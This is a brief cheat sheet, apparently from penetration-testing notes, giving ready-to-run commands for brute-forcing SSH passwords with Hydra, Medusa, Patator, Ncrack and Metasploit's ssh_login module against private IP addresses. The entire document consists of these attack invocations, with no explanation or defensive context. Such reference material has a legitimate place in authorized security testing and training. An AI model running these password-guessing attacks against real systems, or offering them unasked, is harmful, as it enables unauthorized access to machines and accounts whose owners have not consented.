# Bruteforce

### Hydra Brute Force SSH Password

```
hydra -L User.txt -P Passwords.txt 192.168.1.10 ssh
```



### Medusa Brute Force SSH Password

```
medusa -h 192.168.0.8 -U user.txt -P password.txt -M ssh
```



### Patator Brute Force SSH Password

```
patator ssh_login host=192.168.0.8 user=FILE0 0=user.txt password=FILE1 1=password.txt
```



### Brute Force SSH Password using Ncrack

```
ncrack -U user.txt -P password.txt 192.168.0.8:22
```



### Brute Force SSH Password using Metasploit

```
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.0.8
set user_file user.txt
set pass_file password.txt
run
```
